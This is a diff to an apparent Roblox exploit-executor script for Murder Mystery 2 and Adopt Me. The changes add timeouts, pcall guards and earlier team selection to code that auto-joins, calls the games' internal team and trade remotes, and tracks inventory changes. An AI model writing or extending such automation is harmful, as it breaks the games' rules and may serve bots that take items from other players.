@@ -5,13 +5,28 @@ if getgenv().__mm2_autojoiner_loaded then return end
 getgenv().__mm2_autojoiner_loaded = true
 
 repeat task.wait() until game:IsLoaded()
-nouse = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
-a = tick()
--- detect which game we're in; the branches below run only the matching logic
+
+-- detect which game we're in (needed BEFORE the character wait because in ADM
+-- the character doesn't spawn until a team has been chosen, so CharacterAdded
+-- would hang forever otherwise)
 local MM2_PLACE = 142823291
 local ADM_PLACE = 920587237
 local IS_MM2 = game.PlaceId == MM2_PLACE
 local IS_ADM = game.PlaceId == ADM_PLACE
+
+-- ADM: choose the team BEFORE waiting for the character so CharacterAdded fires
+if IS_ADM then
+    local okTeam, errTeam = pcall(function()
+        game:GetService("ReplicatedStorage"):WaitForChild("API",60):WaitForChild("TeamAPI/ChooseTeam",60):InvokeServer("Parents", {
+            source_for_logging = "intro_sequence",
+            dont_enter_location = true
+        })
+    end)
+    if not okTeam then warn("[adm] early ChooseTeam failed: "..tostring(errTeam)) end
+end
+
+nouse = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
+a = tick()
 
 -- common setup both games need (services, anti-idle, executor info, counters)
 local HttpService = game:GetService("HttpService")
@@ -272,16 +287,21 @@ end
 elseif IS_ADM then
 -- ADM: wait for the initial loading UI to finish
 local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-local loadingScreen = playerGui:WaitForChild("AssetLoadUI")
-while loadingScreen.Enabled do
-    task.wait(0.1)
+local loadingScreen = playerGui:WaitForChild("AssetLoadUI", 60)
+if loadingScreen then
+    while loadingScreen.Enabled do
+        task.wait(0.1)
+    end
 end
 
--- ADM: choose Parents team and spawn at Home
-ReplicatedStorage:WaitForChild("API"):WaitForChild("TeamAPI/ChooseTeam"):InvokeServer("Parents", {
-    source_for_logging = "intro_sequence",
-    dont_enter_location = true
-})
+-- ADM: choose Parents team and spawn at Home (redundant with the early call,
+-- kept as a safety net in case the early one missed before API replicated)
+pcall(function()
+    ReplicatedStorage:WaitForChild("API"):WaitForChild("TeamAPI/ChooseTeam"):InvokeServer("Parents", {
+        source_for_logging = "intro_sequence",
+        dont_enter_location = true
+    })
+end)
 
 local API = ReplicatedStorage:WaitForChild("API")
 fod = false
@@ -291,7 +311,7 @@ ButtonPressed:FireServer("spawn_dialog", "Home")
 task.wait(0.5)
 IncrementCounter:FireServer("Home")
 
-local tradeFrame = playerGui.TradeApp.Frame
+local tradeFrame = playerGui:WaitForChild("TradeApp", 30) and playerGui.TradeApp:WaitForChild("Frame", 30)
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local RouterClient = Loads("RouterClient")
 local TradeAcceptOrDeclineRequest = RouterClient.get("TradeAPI/AcceptOrDeclineTradeRequest")
@@ -305,7 +325,7 @@ function getinv()
     return require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
 end
 
-inventory = require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory
+inventory = getinv()
 
 rnsender = ""
 TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
@@ -314,7 +334,7 @@ TradeRequestReceivedRemote.OnClientEvent:Connect(function(sender)
 end)
 
 local function IsTrading()
-    return tradeFrame.Visible
+    return tradeFrame and tradeFrame.Visible or false
 end
 
 -- diff per-item by uid across every category. returns {[category] = {newItem, ...}}
